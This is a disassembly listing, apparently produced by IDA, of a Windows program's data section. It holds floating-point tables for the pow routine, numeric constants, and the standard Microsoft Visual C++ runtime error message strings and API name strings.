		dd 3F25D052h, 5A39C232h, 3D4064FCh, 4000000h, 3F260054h
		dd 7C4B597Eh, 3D070D1Fh, 73800000h, 3F263055h, 0BDBBC457h
		dd 3D4A28E9h, 0A8800000h, 3F265856h, 0ECC252F3h, 3D474989h
		dd 1E000000h, 3F268858h, 0FC01D57h, 3D4E1309h, 97000000h
		dd 3F26B859h, 0C8678403h, 3D391227h, 13000000h,	3F26E85Bh
		dd 0F244140Dh, 3D155E22h, 10000000h, 0BF170FD2h, 29329AEEh
		dd 0BD24CAA4h, 0CE000000h, 0BF16DFD2h, 8562DC37h, 0BD4CB96Dh
		dd 4D000000h, 0BF16BFD3h, 9B9DBFB8h, 0BD2813E1h, 9000000h
		dd 0BF168FD4h, 53011CC5h, 0BD34C1A4h, 0C3000000h, 0BF165FD4h
		dd 0C43E09BCh, 0BD4CD61Ah, 7C000000h, 0BF162FD5h, 0F90CA8BAh
		dd 0BD4D64CEh, 34000000h, 0BF15FFD6h, 13B1C267h, 0BD3819D7h
		dd 0EA000000h, 0BF15CFD6h, 711DB032h, 0BD319CDAh, 9E000000h
		dd 0BF159FD7h, 0C71A6171h, 0BD43A950h, 51000000h, 0BF156FD8h
		dd 0EECE00B9h, 0BD393B25h, 2000000h, 0BF153FD9h, 8B5FE712h
		dd 0BD43AB30h, 77000000h, 0BF151FD9h, 36256734h, 0BD4CA5E7h
		dd 26000000h, 0BF14EFDAh, 3B9C924Dh, 0BD40886Bh, 0D3000000h
		dd 0BF14BFDAh, 0FF31AA38h, 0BD428441h, 7F000000h, 0BF148FDBh
		dd 1675C431h, 0BD14CB42h, 29000000h, 0BF145FDCh, 0BAEBB8Dh
		dd 0BCF8FB59h, 0D1000000h, 0BF142FDCh, 0A38E93F3h, 0BD3A1F2Ch
		dd 78000000h, 0BF13FFDDh, 83D52ED1h, 0BD2DC25Eh, 1D000000h
		dd 0BF13CFDEh, 0EFA081F3h, 0BD3FD5B6h, 8A000000h, 0BF13AFDEh
		dd 0D4F2BF07h, 0BD49D89Dh, 2D000000h, 0BF137FDFh, 5D3A13B4h
		dd 0BD3E4F3Dh, 0CE000000h
		dd 0BF134FDFh, 6A5F7723h, 0BD428FD9h, 6E000000h, 0BF131FE0h
		dd 288690A5h, 0BD20452Bh, 0C000000h, 0BF12EFE1h, 7E56EA2Dh
		dd 0BD1D5F7Ch, 0A8000000h, 0BF12BFE1h, 7D421DEBh, 0BD415FC4h
		dd 43000000h, 0BF128FE2h, 0A8DC214Bh, 0BD3A598Ch, 0DC000000h
		dd 0BF125FE2h, 0D7350F14h, 0BD4712F1h, 74000000h, 0BF122FE3h
		dd 8EFA43E1h, 0BD3E2487h, 0D8000000h, 0BF120FE3h, 0EE23F9F0h
		dd 0BD48ADFFh, 6D000000h, 0BF11DFE4h, 0AEC2D96h, 0BD4D81E0h
		dd 1000000h, 0BF11AFE5h, 0EF9956B1h, 0BD406EDDh, 93000000h
		dd 0BF117FE5h, 5E105551h, 0BD4174F6h, 24000000h, 0BF114FE6h
		dd 6B71311h, 0BCF284C3h, 0B2000000h, 0BF111FE6h, 0DFEDBEC3h
		dd 0BD4DCC69h, 40000000h, 0BF10EFE7h, 0EE38AA4Bh, 0BD323B7Ch
		dd 0CC000000h, 0BF10BFE7h, 0FD28C140h, 0BD144104h, 56000000h
		dd 0BF108FE8h, 36D6A695h, 0BD34171Ah, 0B1000000h, 0BF106FE8h
		dd 0ACEA06CDh, 0BD4354A0h, 39000000h, 0BF103FE9h, 0FAE67526h
		dd 0BD2EB1B1h, 0BF000000h, 0BF100FE9h, 0FC467E03h, 0BD343A73h
		dd 86000000h, 0BF0FBFD4h, 0ED090ECAh, 0BD4AA705h, 8C000000h
		dd 0BF0F5FD5h, 0D4CDE8Eh, 0BD4949CDh, 90000000h, 0BF0EFFD6h
		dd 8340BD3Dh, 0BD281630h, 90000000h, 0BF0E9FD7h, 2E8624A6h
		dd 0BCFB47FDh, 8C000000h, 0BF0E3FD8h, 5233867Dh, 0BD338FCAh
		dd 86000000h, 0BF0DDFD9h, 342E7C21h, 0BCF9CF14h, 2A000000h
		dd 0BF0D9FDAh, 7D84B6E0h, 0BD338882h, 1E000000h, 0BF0D3FDBh
		dd 6D6A2247h, 0BD3B3E0Ah, 0E000000h, 0BF0CDFDCh, 0C1DF2A86h
		dd 0BD4F92AEh, 0FC000000h, 0BF0C7FDCh, 0A2200D30h, 0BD4F9F3Ah
		dd 0E8000000h, 0BF0C1FDDh, 32AD9B9Fh, 0BD3B894Bh, 0D0000000h
		dd 0BF0BBFDEh, 0D2C46051h, 0BD3405D8h, 0B4000000h, 0BF0B5FDFh
		dd 0D420A715h, 0BD445A0Bh, 96000000h, 0BF0AFFE0h, 36E0A90Fh
		dd 0BD399401h, 2A000000h, 0BF0ABFE1h, 0F2AF86BBh, 0BD46B0A6h
		dd 6000000h, 0BF0A5FE2h, 0CA335408h, 0BD4BF4A2h, 0E0000000h
		dd 0BF09FFE2h, 0B12E4D93h, 0BD3EA2D6h, 0B6000000h, 0BF099FE3h
		dd 5FB7F840h, 0BD40C6FDh, 8A000000h, 0BF093FE4h, 5C9C3116h
		dd 0BCE55568h, 58000000h, 0BF08DFE5h, 0DFA2E7C3h, 0BD4DFC70h
		dd 26000000h, 0BF087FE6h, 0B84AC785h, 0BD337897h, 0F0000000h
		dd 0BF081FE6h, 0C6ACD2D7h, 0BD1CA71Ah, 0B6000000h, 0BF07BFE7h
		dd 2F1DE078h, 0BD370C68h, 38000000h, 0BF077FE8h, 76C79D4Ch
		dd 0BD45185Dh, 0FA000000h, 0BF071FE8h, 0DD985699h, 0BD33BB0Ch
		dd 0B8000000h, 0BF06BFE9h, 642B301h, 0BD3976C0h, 72000000h
		dd 0BF065FEAh, 0F5A163E7h, 0BD4DB1E6h, 2A000000h, 0BF05FFEBh
		dd 8263596h, 0BD4CC118h, 0E0000000h, 0BF059FEBh, 0F912D171h
		dd 0BD33D1DFh, 92000000h, 0BF053FECh, 52911A3Ah, 0BD24A5AEh
		dd 40000000h, 0BF04DFEDh, 249F8EDCh, 0BD3D050Fh, 0EC000000h
		dd 0BF047FEDh, 0DD924B0Eh, 0BD27D102h, 5C000000h, 0BF043FEEh
		dd 7BAAD081h, 0BD3E6295h, 2000000h, 0BF03DFEFh,	4524F2A0h
		dd 0BD4376ADh, 0A6000000h, 0BF037FEFh, 3877E949h, 0BD275291h
		dd 46000000h, 0BF031FF0h, 6A5FF847h, 0BD292CB2h, 0E2000000h
		dd 0BF02BFF0h, 0EC6A2BAEh, 0BD44DA42h, 7C000000h, 0BF025FF1h
		dd 56B600Bh, 0BD4181E4h, 12000000h, 0BF01FFF2h,	0A7722725h
		dd 0BD4C420Ch, 0A6000000h, 0BF019FF2h, 9454BC09h, 0BD451AB9h
		dd 6000000h, 0BF015FF3h, 0FAC61211h, 0BD4F4702h, 96000000h
		dd 0BF00FFF3h, 691E23E3h, 0BD23CCBFh, 20000000h, 0BF009FF4h
		dd 5EDE8A3Bh, 0BD48B7D8h, 0A8000000h, 0BF003FF4h, 4A602836h
		dd 0BD4A94F9h, 5C000000h, 0BEFFBFEAh, 0BD4248B6h, 0BD35151Eh
		dd 60000000h, 0BEFEFFEBh, 0BAEBDE60h, 0BD31312Eh, 5C000000h
		dd 0BEFE3FECh, 8B2A851h, 0BD44BF0Eh, 54000000h,	0BEFD7FEDh
		dd 44563CDDh, 0BD3DFBE0h, 44000000h, 0BEFCBFEEh, 6BB2CF4Dh
		dd 0BD47553Ah, 0E4000000h, 0BEFC3FEEh, 2C9E1514h, 0BD02B327h
		dd 0C8000000h, 0BEFB7FEFh, 0D79568B8h, 0BD4655CDh, 0A8000000h
		dd 0BEFABFF0h, 0C6A29955h, 0BD4998C8h, 84000000h, 0BEF9FFF1h
		dd 3879074h, 0BD35E840h, 58000000h, 0BEF93FF2h,	9595F318h
		dd 0BD34CFA0h, 24000000h, 0BEF87FF3h, 6389E086h, 0BD47F3D6h
		dd 0EC000000h, 0BEF7BFF3h, 0DD1DF79h, 0BD43982Fh, 0AC000000h
		dd 0BEF6FFF4h, 0B7407C7h, 0BD4D54D7h, 68000000h, 0BEF63FF5h
		dd 1E4119E9h, 0BD4529CBh, 0E0000000h, 0BEF5BFF5h, 63B0E57Ah
		dd 0BD4EA8CFh, 94000000h, 0BEF4FFF6h, 0D1F9867Bh, 0BD1A872Dh
		dd 3C000000h, 0BEF43FF7h, 80238647h, 0BD46113Fh, 0E0000000h
		dd 0BEF37FF7h, 772D7DA6h, 0BD46E9D9h, 80000000h, 0BEF2BFF8h
		dd 84B1770Ch, 0BD276AC1h, 18000000h, 0BEF1FFF9h, 0FF78E451h
		dd 0BD171E07h, 0A8000000h, 0BEF13FF9h, 2A88BDF6h, 0BD3C0A10h
		dd 34000000h, 0BEF07FFAh, 8BE9E4A8h, 0BD2CFA09h, 70000000h
		dd 0BEEF7FF5h, 55BEDC7Eh, 0BD3D2059h, 18000000h, 0BEEE7FF6h
		dd 0CBD1C3D4h, 0BD47B79Ah, 10000000h, 0BEECFFF7h, 0FF9B8582h
		dd 0BD37B870h, 0F8000000h, 0BEEB7FF7h, 1038DD6Dh, 0BD3C31FBh
		dd 0D0000000h, 0BEE9FFF8h, 0A68AA227h, 0BD4E6DE6h, 0A0000000h
		dd 0BEE87FF9h, 9CE4E699h, 0BD4CDAF0h, 68000000h, 0BEE6FFFAh
		dd 59EEE94Bh, 0BD32C030h, 20000000h, 0BEE57FFBh, 0C4719FCCh
		dd 0BD1FEAD0h, 0C8000000h, 0BEE3FFFBh, 42E976ADh, 0BD396566h
		dd 30000000h, 0BEE2FFFCh, 9DB21925h, 0BD46C732h, 0C8000000h
		dd 0BEE17FFCh, 4517A5CEh, 0BD389EABh, 0A0000000h, 0BEDFFFFAh
		dd 3DA560D7h, 0BD3FDF0Eh, 0A0000000h, 0BEDCFFFBh, 4511FBCBh
		dd 0BD0A7C3Dh, 80000000h, 0BED9FFFCh, 4D13DF75h, 0BD078088h
		dd 40000000h, 0BED6FFFDh, 0E439AE99h, 0BD3EC0A3h, 0F0000000h
		dd 0BED3FFFDh, 0BBFACE01h, 0BD36C139h, 80000000h, 0BED0FFFEh
		dd 0A3C176Bh, 0BD4578E6h, 0
		dd 0BECBFFFEh, 714383F2h, 0BD3B5254h, 80000000h, 0BEC7FFFEh
		dd 85E2F8BBh, 0BD4764E1h, 20000000h, 0BEC1FFFFh, 0D84712A6h
		dd 0BD4C67C0h, 40000000h, 0BEB7FFFFh, 0DD0685Fh, 0BD3F0525h
		dd 80000000h, 0BEA7FFFFh, 538E0E0Ch, 0BD40B553h, 4 dup(0)
xmmword_428B60	xmmword	3E79C3A6966457EE3FC47FD462B3B816h ; DATA XREF: __pow_pentium4+211r
xmmword_428B70	xmmword	0BFD62E4346694107BFB550472A8BB463h ; DATA XREF:	__pow_pentium4+225r
		dd 0
		dd 3FF00000h, 2	dup(0)
		dd 0A9FB3335h, 3FF0163Dh, 9AB8CDB7h, 3C9B6129h,	3E778061h
		dd 3FF02C9Ah, 535B085Dh, 0BC719083h, 0E86E7F85h, 3FF04315h
		dd 1977C96Eh, 0BC90A31Ch, 0D3158574h, 3FF059B0h, 0A475B465h
		dd 3C8D73E2h, 29DDF6DEh, 3FF0706Bh, 0E2B13C26h,	0BC8C91DFh
		dd 18759BC8h, 3FF08745h, 4BB284FFh, 3C6186BEh, 0CAC6F383h
		dd 3FF09E3Eh, 18316135h, 3C914878h, 6CF9890Fh, 3FF0B558h
		dd 4ADC610Ah, 3C98A62Eh, 2B7247F7h, 3FF0CC92h, 16E24F71h
		dd 3C901EDCh, 32D3D1A2h, 3FF0E3ECh, 27C57B52h, 3C403A17h
		dd 0AFFED31Bh, 3FF0FB66h, 0C44EBD7Bh, 0BC6B9BEDh, 0D0125B51h
		dd 3FF11301h, 39449B39h, 0BC96C510h, 0C06C31CCh, 3FF12ABDh
		dd 0B36CA5C7h, 0BC51B514h, 0AEA92DE0h, 3FF1429Ah, 9AF1369Eh
		dd 0BC932FBFh, 0C8A58E51h, 3FF15A98h, 0B9EEAB09h, 3C82406Ah
		dd 3C7D517Bh, 3FF172B8h, 0B9D78A75h, 0BC819041h, 388C8DEAh
		dd 3FF18AF9h, 0D1970F6Bh, 0BC911023h, 0EB6FCB75h, 3FF1A35Bh
		dd 7B4968E4h, 3C8E5B4Ch, 84045CD4h, 3FF1BBE0h, 352EF607h
		dd 0BC995386h, 3168B9AAh, 3FF1D487h, 0A2643Ch, 3C9E016Eh
		dd 22FCD91Dh, 3FF1ED50h, 27BB78Bh, 0BC91DF98h, 88628CD6h
		dd 3FF2063Bh, 814A8494h, 3C8DC775h, 917DDC96h, 3FF21F49h
		dd 9494A5EDh, 3C82A97Eh, 6E756238h, 3FF2387Ah, 0B6C70572h
		dd 3C99B07Eh, 4FB2A63Fh, 3FF251CEh, 0BEF4F4A4h,	3C8AC155h
		dd 65E27CDDh, 3FF26B45h, 9940E9D9h, 3C82BD33h, 0E1F56381h
		dd 3FF284DFh, 8C3F0D7Dh, 0BC9A4C3Ah, 0F51FDEE1h, 3FF29E9Dh
		dd 0AFAD1255h, 3C8612E8h, 0D0DAD990h, 3FF2B87Fh, 0D6381AA3h
		dd 0BC410ADCh, 0A6E4030Bh, 3FF2D285h, 54DB41D4h, 3C900247h
		dd 0A93E2F56h, 3FF2ECAFh, 45D52383h, 3C71CA0Fh,	0A31B715h
		dd 3FF306FEh, 0D23182E4h, 3C86F46Ah, 0FC4CD831h, 3FF32170h
		dd 8E18047Ch, 3C8A9CE7h, 0B26416FFh, 3FF33C08h,	843659A5h
		dd 3C932721h, 5F929FF1h, 3FF356C5h, 5C4E4628h, 0BC8B5CEEh
		dd 373AA9CBh, 3FF371A7h, 0BF42EAE1h, 0BC963AEAh, 6D05D866h
		dd 3FF38CAEh, 3C9904BCh, 0BC9E958Dh, 34E59FF7h,	3FF3A7DBh
		dd 0D661F5E2h, 0BC75E436h, 0C313A8E5h, 3FF3C32Dh, 375D29C3h
		dd 0BC9EFFF8h, 4C123422h, 3FF3DEA6h, 11F09EBBh,	3C8ADA09h
		dd 4AC801Ch, 3FF3FA45h,	0F956F9F3h, 0BC97D023h,	21F72E2Ah
		dd 3FF4160Ah, 1C309278h, 0BC5EF369h, 0D950A897h, 3FF431F5h
		dd 0E35F7998h, 0BC81C7DDh, 6061892Dh, 3FF44E08h, 4EF80CFh
		dd 3C489B7Ah, 0ED1D0057h, 3FF46A41h, 0D1648A76h, 3C9C944Bh
		dd 0B5C13CD0h, 3FF486A2h, 0B69062F0h, 3C73C1A3h, 0F0D7D3DEh
		dd 3FF4A32Ah, 0F3D1BE56h, 3C99CB62h, 0D5362A27h, 3FF4BFDAh
		dd 0AFEC42E2h, 3C7D4397h, 99FDDD0Dh, 3FF4DCB2h,	0BC6A7833h
		dd 3C98ECDBh, 769D2CA7h, 3FF4F9B2h, 0D25957E3h,	0BC94B309h
		dd 0A2CF6642h, 3FF516DAh, 69BD93EEh, 0BC8F7685h, 569D4F82h
		dd 3FF5342Bh, 1DB13CACh, 0BC807ABEh, 0CA5D920Fh, 3FF551A4h
		dd 0EFEDE59Ah, 0BC8D689Ch, 36B527DAh, 3FF56F47h, 11D93ACh
		dd 3C99BB2Ch, 0D497C7FDh, 3FF58D12h, 5B9A1DE7h,	3C8295E1h
		dd 0DD485429h, 3FF5AB07h, 54647ACh, 3C96324Ch, 8A5946B7h
		dd 3FF5C926h, 816986A2h, 3C3C4B1Bh, 15AD2148h, 3FF5E76Fh
		dd 3080E65Dh, 3C9BA6F9h, 0B976DC09h, 3FF605E1h,	9B56DE47h
		dd 0BC93E242h, 0B03A5585h, 3FF6247Eh, 7E40B496h, 0BC9383C1h
		dd 34CCC320h, 3FF64346h, 759D8932h, 0BC8C483Ch,	82552225h
		dd 3FF66238h, 87591C33h, 0BC9BB609h, 0D44CA973h, 3FF68155h
		dd 44F73E64h, 3C6038AEh, 667F3BCDh, 3FF6A09Eh, 13B26455h
		dd 0BC9BDD34h, 750BDABFh, 3FF6C012h, 67FF0B0Ch,	0BC728956h
		dd 3C651A2Fh, 3FF6DFB2h, 683C88AAh, 0BC6BBE3Ah,	0F9519484h
		dd 3FF6FF7Dh, 25860EF6h, 0BC883C0Fh, 0E8EC5F74h, 3FF71F75h
		dd 86887A99h, 0BC816E47h, 48A58174h, 3FF73F9Ah,	6C65D53Bh
		dd 0BC90A8D9h, 564267C9h, 3FF75FEBh, 57316DD3h,	0BC902459h
		dd 4FDE5D3Fh, 3FF78069h, 0A02162Ch, 3C9866B8h, 73EB0187h
		dd 3FF7A114h, 0EE04992Fh, 0BC841577h, 130C132h,	3FF7C1EDh
		dd 0D1164DD5h, 3C9F124Ch, 36CF4E62h, 3FF7E2F3h,	0BA15797Eh
		dd 3C705D02h, 543E1A12h, 3FF80427h, 626D972Ah, 0BC927C86h
		dd 994CCE13h, 3FF82589h, 0D41532D7h, 0BC9D4C1Dh, 4623C7ADh
		dd 3FF8471Ah, 0A341CDFBh, 0BC88D684h, 9B4492EDh, 3FF868D9h
		dd 9BD4F6BAh, 0BC9FC6F8h, 0D98A6699h, 3FF88AC7h, 0F37CB53Ah
		dd 3C9994C2h, 422AA0DBh, 3FF8ACE5h, 56864B26h, 3C96E9F1h
		dd 16B5448Ch, 3FF8CF32h, 32E9E3AAh, 0BC70D55Eh,	99157736h
		dd 3FF8F1AEh, 0A2E3976Ch, 3C85CC13h, 0B91FFC6h,	3FF9145Bh
		dd 2E582523h, 0BC9DD679h, 0B0CDC5E5h, 3FF93737h, 81B57EBBh
		dd 0BC675FC7h, 0CBC8520Fh, 3FF95A44h, 96A5F039h, 0BC764B7Ch
		dd 9FDE4E50h, 3FF97D82h, 7C1B85D0h, 0BC9D185Bh,	70CA07BAh
		dd 3FF9A0F1h, 91CEE632h, 0BC9173BDh, 82A3F090h,	3FF9C491h
		dd 0B071F2BEh, 3C7C7C46h, 19E32323h, 3FF9E863h,	78E64C6Eh
		dd 3C7824CAh, 7B5DE565h, 3FFA0C66h, 5D1CD532h, 0BC935949h
		dd 0EC4A2D33h, 3FFA309Bh, 7DDC36ABh, 3C96305Ch,	0B23E255Dh
		dd 3FFA5503h, 0DB8D41E1h, 0BC9D2F6Eh, 1330B358h, 3FFA799Eh
		dd 0CAC563C6h, 3C9BCB7Eh, 5579FDBFh, 3FFA9E6Bh,	0EF7FD31h
		dd 3C90FAC9h, 0BFD3F37Ah, 3FFAC36Bh, 0CAE76CD0h, 0BC8F9234h
		dd 995AD3ADh, 3FFAE89Fh, 345DCC81h, 3C97A1CDh, 298DB666h
		dd 3FFB0E07h, 4C80E424h, 0BC9BDEF5h, 0B84F15FBh, 3FFB33A2h
		dd 3084D707h, 0BC62805Eh, 8DE5593Ah, 3FFB5972h,	0BBBA6DE3h
		dd 0BC9C71DFh, 0F2FB5E47h, 3FFB7F76h, 7E54AC3Ah, 0BC75584Fh
		dd 30A1064Ah, 3FFBA5B0h, 0E54292Eh, 0BC9EFCD3h,	904BC1D2h
		dd 3FFBCC1Eh, 7A2D9E84h, 3C823DD0h, 5BD71E09h, 3FFBF2C2h
		dd 3F6B9C72h, 0BC9EFDCAh, 0DD85529Ch, 3FFC199Bh, 895048DDh
		dd 3C811065h, 5FFFD07Ah, 3FFC40ABh, 0E083C60Ah,	3C9B4537h
		dd 2E57D14Bh, 3FFC67F1h, 0FF483CACh, 3C92884Dh,	9406E7B5h
		dd 3FFC8F6Dh, 48805C44h, 3C71ACBCh, 0DCEF9069h,	3FFCB720h
		dd 0D1E949DBh, 3C7503CBh, 555DC3FAh, 3FFCDF0Bh,	53829D72h
		dd 0BC8DD83Bh, 4A07897Ch, 3FFD072Dh, 43797A9Ch,	0BC9CBC37h
		dd 80D89F2h, 3FFD2F87h,	719D8577h, 0BC9D487Bh, 0DCFBA487h
		dd 3FFD5818h, 0D75B3706h, 3C82ED02h, 16C98398h,	3FFD80E3h
		dd 8BEDDFE8h, 0BC911EC1h, 3DB3285h, 3FFDA9E6h, 696DB532h
		dd 3C9C2300h, 0F301B460h, 3FFDD321h, 78F018C2h,	3C92DA57h
		dd 337B9B5Fh, 3FFDFC97h, 4F184B5Bh, 0BC91A5CDh,	14F5A129h
		dd 3FFE2646h, 817A1496h, 0BC97B627h, 0E78B3FF6h, 3FFE502Eh
		dd 80A9CC8Fh, 3C839E89h, 0FBC74C83h, 3FFE7A51h,	0CA0C8DE1h
		dd 3C92D522h, 0A2A490DAh, 3FFEA4AFh, 179C2893h,	0BC9E9C23h
		dd 2D8E67F1h, 3FFECF48h, 0B411AD8Ch, 0BC9C93F3h, 0EE615A27h
		dd 3FFEFA1Bh, 86A4B6B0h, 3C9DC7F4h, 376BBA97h, 3FFF252Bh
		dd 0BF0D8E43h, 3C93A1A5h, 5B6E4540h, 3FFF5076h,	2DD8A18Ah
		dd 3C99D3E1h, 0AD9CBE14h, 3FFF7BFDh, 0D0063509h, 0BC9DBB12h
		dd 819E90D8h, 3FFFA7C1h, 0F3A5931Eh, 3C874853h,	2B8F71F1h
		dd 3FFFD3C2h, 966579E7h, 3C62EB74h
qword_429380	dq 4338000000000000h	; DATA XREF: __pow_pentium4+26Cr
					; __pow_pentium4+278r ...
		dd 0
		dd 43380000h
xmmword_429390	xmmword	0FFFFFFFFFFFFF000FFFFFFFFFFFFFh	; DATA XREF: __pow_pentium4+6r
					; __pow_pentium4+A4r ...
xmmword_4293A0	xmmword	3FF00000000000003FF0000000000000h ; DATA XREF: __pow_pentium4+Er
					; __pow_pentium4+D6r ...
xmmword_4293B0	xmmword	7FFFFFFFFFFFFFFF7FFFFFFFFFFFFFFFh ; DATA XREF: __pow_pentium4+354r
					; __pow_pentium4+401r ...
xmmword_4293C0	xmmword	3FAC6B08D704A0BF3F55D87FE78A6731h ; DATA XREF: __pow_pentium4+298r
					; __pow_pentium4+8C6r
xmmword_4293D0	xmmword	3FCEBFBDFF82C58E3F83B2AB6FBA4E77h ; DATA XREF: __pow_pentium4+2E7r
					; __pow_pentium4+92Ar
qword_4293E0	dq 3FE62E42FEFA39EFh	; DATA XREF: __pow_pentium4+2C7r
					; __pow_pentium4+8E7r
qword_4293E8	dq 0FFFFFFFFF8000000h	; DATA XREF: __pow_pentium4+8Er
					; __pow_pentium4+F4r ...
qword_4293F0	dq 0BFF7154740000000h	; DATA XREF: __pow_pentium4+100r
qword_4293F8	dq 7FF0000000000001h	; DATA XREF: __pow_pentium4+6A1r
dbl_429400	dq 1.797693134862316e308 ; DATA	XREF: __pow_pentium4:RET_INFr
dbl_429408	dq -1.797693134862316e308 ; DATA XREF: __pow_pentium4:RET_NINFr
qword_429410	dq 8000000000000000h	; DATA XREF: __pow_pentium4+412r
					; __pow_pentium4:RET_NEG_ZEROr
qword_429418	dq 0FFE0000000000000h	; DATA XREF: __pow_pentium4+A8Dr
qword_429420	dq 7FE0000000000000h	; DATA XREF: __pow_pentium4+A95r
					; __pow_pentium4:RET_INF_OF2r
qword_429428	dq 10000000000000h	; DATA XREF: __pow_pentium4:RET_ZERO_UFr
qword_429430	dq 0FFF8000000000000h	; DATA XREF: __pow_pentium4+6A9r
		align 10h
dbl_429440	dq 0.5			; DATA XREF: __d_inttype+37r
; CHAR aCorexitprocess[]
aCorexitprocess	db 'CorExitProcess',0   ; DATA XREF: ___crtCorExitProcess+14o
		align 4
; const	WCHAR aMscoree_dll
aMscoree_dll:				; DATA XREF: ___crtCorExitProcess+5o
		unicode	0, <mscoree.dll>,0
aRuntimeError	db 'runtime error ',0
		align 10h
		db 0Dh,0Ah,0
		align 4
aTlossError	db 'TLOSS error',0Dh,0Ah,0
		align 4
aSingError	db 'SING error',0Dh,0Ah,0
		align 4
aDomainError	db 'DOMAIN error',0Dh,0Ah,0
		align 8
aR6034AnApplica	db 'R6034',0Dh,0Ah
		db 'An application has made an attempt to load the C runtime library '
		db 'incorrectly.',0Ah
		db 'Please contact the application',27h,'s support team for more informa'
		db 'tion.',0Dh,0Ah,0
		align 8
aR6033AttemptTo	db 'R6033',0Dh,0Ah
		db '- Attempt to use MSIL code from this assembly during native code '
		db 'initialization',0Ah
		db 'This indicates a bug in your application. It is most likely the r'
		db 'esult of calling an MSIL-compiled (/clr) function from a native c'
		db 'onstructor or from DllMain.',0Dh,0Ah,0
		align 10h
aR6032NotEnough	db 'R6032',0Dh,0Ah
		db '- not enough space for locale information',0Dh,0Ah,0
		align 8
aR6031AttemptTo	db 'R6031',0Dh,0Ah
		db '- Attempt to initialize the CRT more than once.',0Ah
		db 'This indicates a bug in your application.',0Dh,0Ah,0
		align 4
aR6030CrtNotIni	db 'R6030',0Dh,0Ah
		db '- CRT not initialized',0Dh,0Ah,0
		align 4
aR6028UnableToI	db 'R6028',0Dh,0Ah
		db '- unable to initialize heap',0Dh,0Ah,0
		align 4
aR6027NotEnough	db 'R6027',0Dh,0Ah
		db '- not enough space for lowio initialization',0Dh,0Ah,0
		align 4
aR6026NotEnough	db 'R6026',0Dh,0Ah
		db '- not enough space for stdio initialization',0Dh,0Ah,0
		align 4
aR6025PureVirtu	db 'R6025',0Dh,0Ah
		db '- pure virtual function call',0Dh,0Ah,0
		align 4
aR6024NotEnough	db 'R6024',0Dh,0Ah
		db '- not enough space for _onexit/atexit table',0Dh,0Ah,0
		align 4
aR6019UnableToO	db 'R6019',0Dh,0Ah
		db '- unable to open console device',0Dh,0Ah,0
		align 10h
aR6018Unexpecte	db 'R6018',0Dh,0Ah
		db '- unexpected heap error',0Dh,0Ah,0
		align 4
aR6017Unexpecte	db 'R6017',0Dh,0Ah
		db '- unexpected multithread lock error',0Dh,0Ah,0
		align 4
aR6016NotEnough	db 'R6016',0Dh,0Ah
		db '- not enough space for thread data',0Dh,0Ah,0
aThisApplicatio	db 0Dh,0Ah
		db 'This application has requested the Runtime to terminate it in an '
		db 'unusual way.',0Ah
		db 'Please contact the application',27h,'s support team for more informa'
		db 'tion.',0Dh,0Ah,0
		align 4
aR6009NotEnough	db 'R6009',0Dh,0Ah
		db '- not enough space for environment',0Dh,0Ah,0
aR6008NotEnough	db 'R6008',0Dh,0Ah
		db '- not enough space for arguments',0Dh,0Ah,0
		align 10h
aR6002FloatingP	db 'R6002',0Dh,0Ah      ; DATA XREF: .data:off_43028Co
		db '- floating point support not loaded',0Dh,0Ah,0
		align 10h
aMicrosoftVisua	db 'Microsoft Visual C++ Runtime Library',0 ; DATA XREF: __NMSG_WRITE+164o
		align 4
; char asc_4299F8[]
asc_4299F8	db 0Ah			; DATA XREF: __NMSG_WRITE:loc_41A6B8o
		db 0Ah,0
		align 4
; char a___[4]
a___		db '...',0              ; DATA XREF: __NMSG_WRITE+F2o
; char aProgramNameUnk[]
aProgramNameUnk	db '<program name unknown>',0 ; DATA XREF: __NMSG_WRITE+ADo
		align 4
; char aRuntimeErrorPr[]
aRuntimeErrorPr	db 'Runtime Error!',0Ah ; DATA XREF: __NMSG_WRITE+65o
		db 0Ah
		db 'Program: ',0
		align 8
dword_429A38	dd 0C0000005h, 0Bh, 0	; DATA XREF: __initptd+29o
					; _freefls(x)+7Co
		dd 0C000001Dh, 4, 0
		dd 0C0000096h, 4, 0
		dd 0C000008Dh, 8, 0
		dd 0C000008Eh, 8, 0
		dd 0C000008Fh, 8, 0
		dd 0C0000090h, 8, 0
		dd 0C0000091h, 8, 0
		dd 0C0000092h, 8, 0
		dd 0C0000093h, 8, 0
dword_429AB0	dd 0			; DATA XREF: __wincmdln+1Do
; CHAR aEncodepointer[]
aEncodepointer	db 'EncodePointer',0    ; DATA XREF: __encode_pointer:loc_41B09Fo
					; __initptd+3Ao
		align 4
; const	WCHAR aKernel32_dll_0
aKernel32_dll_0:			; DATA XREF: __encode_pointer:loc_41B084o
					; __decode_pointer:loc_41B0FFo	...
		unicode	0, <KERNEL32.DLL>,0
		align 10h
; CHAR aDecodepointer[]
aDecodepointer	db 'DecodePointer',0    ; DATA XREF: __decode_pointer:loc_41B11Ao
					; __initptd+4Eo
		align 10h
; CHAR aFlsfree[]
aFlsfree	db 'FlsFree',0          ; DATA XREF: __mtinit+4Do
; CHAR aFlssetvalue[]
aFlssetvalue	db 'FlsSetValue',0      ; DATA XREF: __mtinit+40o
; CHAR aFlsgetvalue[]
aFlsgetvalue	db 'FlsGetValue',0      ; DATA XREF: __mtinit+33o
; CHAR aFlsalloc[]
aFlsalloc	db 'FlsAlloc',0         ; DATA XREF: __mtinit+2Bo
		align 10h
		dd 4030201h, 8070605h, 0C0B0A09h, 100F0E0Dh, 14131211h
		dd 18171615h, 1C1B1A19h, 201F1E1Dh, 24232221h, 28272625h
		dd 2C2B2A29h, 302F2E2Dh, 34333231h, 38373635h, 3C3B3A39h
		dd 403F3E3Dh, 44434241h, 48474645h, 4C4B4A49h, 504F4E4Dh
		dd 54535251h, 58575655h, 5C5B5A59h, 605F5E5Dh, 64636261h
		dd 68676665h, 6C6B6A69h, 706F6E6Dh, 74737271h, 78777675h
		dd 7C7B7A79h, 7F7E7Dh, 0
		dd 7FF00000h, 0
		dd 0FFF00000h, 0
		dd 7FE00000h, 0
		dd 200000h, 3 dup(0)
		dd 80000000h, 7F800000h, 0FF800000h, 7FC00000h,	0FFC00000h
		dd 0
		dd 80000000h, 7149F2CAh, 0F149F2CAh, 0DA24260h,	8DA24260h
		dd 0C2F8F359h, 1A56E1Fh, 0C2F8F359h, 81A56E1Fh
dword_429C08	dd 6E6174h		; DATA XREF: ___libm_error_support:loc_41D5F6o
dword_429C0C	dd 736F63h		; DATA XREF: ___libm_error_support:loc_41D5EDo
dword_429C10	dd 6E6973h		; DATA XREF: ___libm_error_support:loc_41D5E4o
aModf		db 'modf',0             ; DATA XREF: ___libm_error_support:loc_41D5D8o
		align 4
